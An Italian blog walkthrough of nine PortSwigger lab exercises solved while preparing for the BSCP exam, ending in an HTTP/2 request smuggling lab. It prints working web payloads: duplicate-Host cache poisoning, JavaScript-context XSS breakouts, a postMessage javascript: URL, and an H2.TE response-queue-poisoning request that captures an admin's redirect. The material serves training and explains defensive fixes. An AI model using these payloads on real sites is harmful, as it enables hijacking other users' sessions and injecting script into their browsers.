---
layout: post
title: "Nove tiri fino allo smuggling: far girare l'intero primo step finché la ruota non paga"
date: 2026-10-28
categories: [web-security, walkthrough]
tags: [portswigger, bscp, request-smuggling, h2-desync, web-cache-poisoning, host-header, reflected-xss, dom-xss, mystery-lab, burp-suite]
excerpt: "Mi ero dato una regola — tirare lab a caso finché non usciva il request smuggling — e la ruota mi ha rifilato otto lab di cache poisoning, cookie riflessi e tre lab che avevo già risolto, prima di decidersi a pagare."
lang: it
page_id: rolling-labs-until-smuggling
permalink: /posts/rolling-labs-until-smuggling/
---

Nono lab caricato, lancio lo scanner sulla barra di ricerca per abitudine, ed eccolo lì: `HTTP/2 TE desync`. Dopo otto lab di header di cache e cookie riflessi, l'unico argomento che stavo davvero aspettando era finalmente uscito. È stata una liberazione — quel sollievo preciso della slot machine che non ti deve niente e che a un certo punto decide di pagare.

Il post è tutto qui, in fondo: mi ero dato una regola, e la ruota ha passato otto lab a rifiutarsi di rispettarla.

## La sfida

Era la prima volta che affrontavo *tutti* gli argomenti del primo step dell'esame BSCP in una sessione sola — il gruppo "ottenere un foothold come utente": XSS, vulnerabilità DOM-based, autenticazione, host header attack, web cache poisoning e request smuggling. Lo smuggling era l'ultima cosa che avevo studiato, e volevo chiudere proprio lì.

Così ci ho fatto un gioco. Ho aperto il mio [Mystery Pool]({% post_url 2026-10-04-mystery-pool-strumento %}), ho spuntato tutti gli argomenti dello step e ho fissato un'unica regola: **tirare lab a caso finché non esce un lab di smuggling.** Niente salti, niente ri-tirare un argomento che non mi andava. Qualunque cosa esca, la risolvo, poi tiro di nuovo. Mi fermo solo quando appare lo smuggling.

La ruota se l'è presa comoda. Ecco cosa mi ha dato prima.

## La sessione

### 1. Un cache poisoning che lo scanner ha etichettato male

Nessuna form per i commenti, quindi lo stored XSS era fuori già all'arrivo. Scan sulla `GET /` e salta fuori un finding di web cache poisoning. Solo che la radice non era davvero "la cache" — la home costruiva l'URL assoluto di uno script di tracking direttamente dall'header `Host`, **porta inclusa**:

```html
<script src="//YOUR-LAB-ID.web-security-academy.net:PORT/resources/js/tracking.js"></script>
```

La risposta era cacheabile (`Cache-Control: max-age=30`, `X-Cache: miss`), quindi il piano era ovvio: far puntare quel `src` al mio exploit server, avvelenare la copia in cache, far caricare il mio script alla vittima. La parte interessante era il *come*.

Cambiare del tutto l'`Host` mi dava un `502` gateway error. E quell'errore è informazione, non un muro: mi diceva che il front-end instrada sull'`Host`, quindi il nome host vero deve restare valido. La porta si rifletteva, e mi ha tentato con un vicolo cieco — una porta da sola non può mandare il browser su un altro host, a meno di rompere la struttura dell'authority con il trucco `userinfo@` (`host:spazzatura@evil.com`), e quel campo viene sanificato nove volte su dieci. Anche qui.

La via pulita era l'ambiguità da cui il lab prende il nome: un **header `Host` duplicato**. Il front-end instrada sul primo (niente gateway error), il back-end costruisce l'URL dello script dal secondo.

```http
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Secondo `Host` puntato al mio exploit server, un `tracking.js` lì che serve `alert(document.cookie)`, avvelena la chiave di cache pulita, fatto. Lezione per gli appunti: lo scanner nomina il *sintomo* (la cache), non la *causa* (un header di cui ci si fida).

### 2. Un cookie non keyed, e il `//` che mi ha ucciso il payload in silenzio

Tiro successivo: nessuna form XSS, DOM Invader muto. Lo stavo già archiviando mentalmente come lab di autenticazione quando, dopo il login, mi accorgo che un cookie `fehost` veniva riflesso dentro un blob JSON in uno `<script>`:

```js
data = {"host":"...","path":"/","frontend":"VALORE-COOKIE"}
```

Stessa forma del lab 1 con un altro vestito: l'input è mio (un cookie), quindi da solo è self-XSS — inutile — ma la risposta è cacheabile e il cookie è **non keyed**, quindi è la cache a consegnare la mia copia avvelenata a tutti. La prova è una `GET /` pulita, *senza* il mio cookie malevolo, che torna comunque avvelenata con `X-Cache: hit`.

La parte che vale l'intero post è *perché il mio primo payload non partiva*. Quello di riflessione dello scanner era il classico:

```
prod-cache-01";alert(1)//
```

Si rifletteva alla perfezione. E non faceva assolutamente niente. Ecco la riga renderizzata:

```js
data = {"host":"...","path":"/","frontend":"prod-cache-01";alert(1)//..."}
```

Il `//` commenta tutto ciò che viene dopo — **compresa la `}` che chiude l'object literal**. Così il parser vede `data = { ... "frontend":"prod-cache-01"` e poi un `;` dove si aspettava una `,` o una `}`. È un `SyntaxError`, e un errore di sintassi avviene a tempo di *parse*: l'intero blocco `<script>` non viene eseguito, `alert(1)` compreso. Sembra giusto ed esegue zero.

Il payload che ha funzionato davvero non chiude nessun commento:

```js
"someString"-alert(1)-"someString"
```

renderizzato così:

```js
data = {"host":"...","path":"/","frontend":"someString"-alert(1)-"someString"}
```

Il valore di `frontend` diventa un'espressione — `"someString" - alert(1) - "someString"` — l'object literal si chiude comunque con la sua `}`, non resta niente in sospeso, e `alert(1)` viene chiamato mentre JS valuta la sottrazione (il risultato è `NaN`; non mi interessa, voglio la side effect). La regola: **un `//` non è gratis quando dopo il punto d'iniezione c'è qualcosa di sintatticamente obbligatorio.** Dentro una struttura, il breakout aritmetico preserva le graffe; il commento le distrugge.

### 3. Due lab che avevo già scritto

Il quarto e il quinto tiro sono state rimpatriate.

Il quarto: niente cache, un cambio di `Host` che tornava `403`, `/admin` un piatto "not found", e un login senza reset password — un profilo che urla host header, non auth. Puntando l'`Host` su Burp Collaborator parte una chiamata esterna: routing-based SSRF via flawed request parsing, il front-end che inoltra dove gli dico io. Quello l'ho già raccontato dall'inizio alla fine — Intruder sul range `192.168.0.x` per trovare l'admin interno, poi la delete — in un [post precedente]({% post_url 2026-10-21-ssrf-flawed-request-parsing-eliminare-admin %}), quindi l'ho chiuso in un paio di minuti e ho ritirato.

Il quinto era un listener `message` senza check su `e.origin`, che infilava un `url` JSON dritto nel `src` di un iframe:

```js
case "load-channel":
    ACMEplayer.element.src = d.url;   // nessuna validazione dello schema
    break;
```

`javascript:print(1)` via un `postMessage` dall'exploit server. Stesso pattern, stesso fix (validare l'origin e lo schema dell'URL), [già documentato]({% post_url 2026-10-12-xss-dom-messaggi-web-url-javascript %}). Ritiro.

### 4. `</script>` batte la stringa JavaScript

Il sesto finalmente mi dà un input vero: una barra di ricerca. Il termine si rifletteva in due punti — HTML-encodato e innocuo dentro l'`<h1>`, e grezzo dentro uno script:

```js
var searchTerms = 'TUO-INPUT';
```

Il bello è che gli apici del JS non li ho rispettati per niente. Questo ha risolto:

```
</script><script>alert(1)</script>
```

Funziona perché **il parser HTML viene prima di JavaScript.** Quando il browser tokenizza `</script>`, chiude l'elemento script a prescindere dal fatto che, per quanto ne sa JS, io sia nel mezzo di una stringa. Il contesto-stringa non ti protegge da un tag di chiusura. Chiuso il primo script, `<script>alert(1)</script>` è un elemento nuovo di zecca che esegue pulito.

Mettilo accanto al lab 2 e hai l'idea intera in un'inquadratura. Lab 2: ero *dentro* un object literal, dovevo rispettare la sintassi JS (`"-alert(1)-"`, niente commento). Lab 6: dentro una stringa JS, ma con un `</script>` a disposizione — vince l'HTML, chiudo il tag e ricomincio, gli apici non contano. Due contesti che sembrano entrambi "sono dentro uno `<script>`", due uscite opposte, perché quello che conta è cosa *circonda* l'iniezione: una graffa obbligatoria contro un tag chiudibile.

### 5. La ruota comincia a ripetersi

Il settimo: un cookie tipo `lastViewedProduct` riflesso dentro un `<a href>`. Reflected XSS, veicolata da cookie — il terzo "già visto" del giro, e lo stesso filo dei lab 1 e 2: un input non ovvio (un cookie) che si riflette, da solo self-XSS, e che ha bisogno di un canale separato per arrivare alla vittima.

L'ottavo era la ruota che mi trollava apertamente: mi ha rifilato **di nuovo il lab 1**, identico, lo stesso cache poisoning via host ambiguo. E non è un bug — è esattamente il limite che avevo scritto io stesso nel post di Mystery Pool: *"PortSwigger sceglie il lab dentro la categoria, quindi lo stesso lab può uscire due volte, e la pagina non può evitarlo."* La mia stessa nota, venuta a presentare il conto. Dieci secondi, `Host` duplicato, ritiro.

### 6. Nono tiro: la ruota paga

Scanner sulla barra di ricerca, estensione HTTP Request Smuggler, e il finding: `HTTP/2 TE desync`, **Severity: High, Confidence: Tentative**. Quel "tentative" è la parte onesta — lo strumento dice *forse*, la conferma tocca a te.

Il meccanismo è un gradino sopra il classico CL.TE: in HTTP/2 la lunghezza del messaggio è intrinseca al protocollo, quindi `Content-Length` e `Transfer-Encoding` non dovrebbero contare niente. Iniziano a contare quando il front-end fa il **downgrade** della richiesta a HTTP/1.1 per parlare col back-end. Infili un `Transfer-Encoding: chunked` dentro la richiesta HTTP/2, e quando viene riscritta in HTTP/1.1 quell'header ci finisce dentro; se il back-end lo onora, front-end e back-end non sono d'accordo su dove finisce il corpo. È il desync **H2.TE**.

Questo lab voleva il **response queue poisoning**, che è la versione cattiva. Non smuggli un *prefisso* che si incolla alla richiesta della prossima vittima — smuggli una richiesta *completa*:

```http
POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net

```

Quella seconda richiesta non ha un gemello lato front-end, quindi il back-end si ritrova una risposta *in più* in coda. Da lì in poi ogni risposta è slittata di uno: ogni utente riceve la risposta destinata a qualcun altro. La rimandi finché la risposta che ti torna è la **`302` dell'admin** — la sua risposta, la sua sessione — e sei passato da "ho rotto il parser" a "sto leggendo la risposta di qualcun altro".

Obiettivo risolto. Smuggling, finalmente, al nono tiro.

## Il pattern

In nove tiri si sono cristallizzate tre cose.

Primo, **una ruota casuale è ripasso spaziato forzato.** Riconoscere un sink `postMessage` o un cookie riflesso in dieci secondi, al settimo lab, invece dei dieci minuti della prima volta — *quello* è l'apprendimento. I doppioni non erano tiri sprecati, erano la misura.

Secondo, c'è un filo che attraversa i lab 1, 2 e 7: **un input non ovvio si riflette, e l'exploit vive o muore sul canale di consegna.** Un `Host`, un cookie — niente di tutto questo è controllato dall'attaccante nel browser della vittima di default, quindi ciascuno ha bisogno di qualcosa in più (una cache non keyed, un gadget che setta il cookie) per atterrare davvero. La riflessione non è mai il traguardo.

Terzo, **è il contesto a scegliere il breakout, non il sink.** Lab 2 e lab 6 mi mettevano entrambi dentro uno `<script>`, e i payload giusti erano opposti — perché uno era avvolto in una struttura da tenere valida, l'altro aveva un tag che potevo semplicemente chiudere.

## Esame e campo

**All'esame**, questo giro è un buon modello del primo step: il tempo non va nei payload ingegnosi, va nel *triage*. Niente form commenti, niente header di cache, un `403` su un cambio di `Host`, `/admin` che torna "not found" — ognuno di questi è un segnale che elimina o apre un'intera categoria prima ancora di scrivere un payload. La chiusura rapida dei doppioni è il punto: se hai allenato i pattern, metà dello step è riconoscimento, e il budget che resta va sull'unico lab (qui l'H2.TE) che richiede davvero una conferma manuale dopo un flag *tentative* dello scanner. Una variante d'esame realistica nasconderebbe lo smuggling dietro un front end più pulito, o renderebbe il timing della coda di risposte meno accomodante, così non puoi appoggiarti all'indizio dello scanner.

**Sul campo**, la classifica si ribalta per impatto, non per come lo etichetta lo scanner. I cache poisoning (lab 1, 2, 8) sono quelli spaventosi: una singola entry avvelenata colpisce ogni visitatore finché non scade il TTL, zero interazione. Le XSS riflesse da cookie e `postMessage` (lab 2, 5, 7) hanno bisogno che la vittima visiti qualcosa o porti un cookie specifico, quindi la loro portata dipende tutta da cosa può fare quell'utente e dal fatto che tu riesca a impostare lo stato. Il response queue poisoning H2.TE è quello col tetto più alto e il più raro: serve un vero mismatch di protocollo tra front-end e back-end, ma quando esiste perde all'ingrosso le risposte di altri utenti, sessioni comprese.

L'unico controllo che avrebbe ucciso quasi tutto questo: **non costruire valori rilevanti per la sicurezza o riflessi verso il client a partire da input controllati dalla richiesta che non hai validato** — né l'`Host`, né `X-Forwarded-Host`, né un cookie — e far concordare front-end e back-end, esattamente, su come è strutturata una richiesta prima che uno dei due si fidi.

## Cosa viene dopo

La sfida era far *apparire* lo smuggling, e ci è riuscita. Il filo aperto è tutto ciò che sta oltre il primo step: ho risolto il response queue poisoning fino a catturare la `302` dell'admin, ma il secondo step del BSCP — trasformare un foothold utente in qualcosa di privilegiato e poi nel server — è dove quella risposta rubata viene davvero spesa. È il prossimo tiro.

## Takeaway

- Lo scanner nomina il sintomo, non la causa: un finding di "web cache poisoning" era in realtà un bug di `Host` di cui ci si fida, e il fix vive sull'header, non sulla cache.
- Un commento `//` non è un breakout gratis — se dopo la tua iniezione deve sopravvivere una `}`, una `)` o una `]`, il commento la cancella e ti becchi un `SyntaxError` che uccide in silenzio l'intero script; dentro una struttura usa la forma aritmetica `"-payload-"`.
- `</script>` chiude un elemento script anche da dentro una stringa JS, perché il parser HTML tokenizza prima che giri JavaScript — il contesto-apici non può salvare la pagina da un tag di chiusura.
- Riflettere un `Host` o un cookie è self-XSS finché qualcosa (una cache non keyed, un gadget che setta il cookie) non lo consegna alla vittima — la riflessione è l'inizio dell'exploit, non la fine.
- Un desync H2.TE parte come un flag *tentative* dello scanner; la conferma, e il salto al response queue poisoning con una richiesta completa smugglata, è manuale.

## Riferimenti utili

- [PortSwigger Web Security Academy: HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger Web Security Academy: Browser-powered desync attacks](https://portswigger.net/web-security/request-smuggling/browser)
- [PortSwigger Web Security Academy: Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger Web Security Academy: HTTP Host header attacks](https://portswigger.net/web-security/host-header)
- [HTTP Request Smuggler su GitHub](https://github.com/PortSwigger/http-request-smuggler)
- [Mystery Pool: un lab casuale solo dagli argomenti che scegli tu]({% post_url 2026-10-04-mystery-pool-strumento %})
- [SSRF via flawed request parsing]({% post_url 2026-10-21-ssrf-flawed-request-parsing-eliminare-admin %})
- [XSS DOM via messaggi web e un URL JavaScript]({% post_url 2026-10-12-xss-dom-messaggi-web-url-javascript %})

*Tutte le tecniche mostrate sono state eseguite in un ambiente di laboratorio isolato (PortSwigger Web Security Academy). Attaccare sistemi che non possiedi o per cui non hai un'autorizzazione scritta è illegale nella maggior parte delle giurisdizioni.*
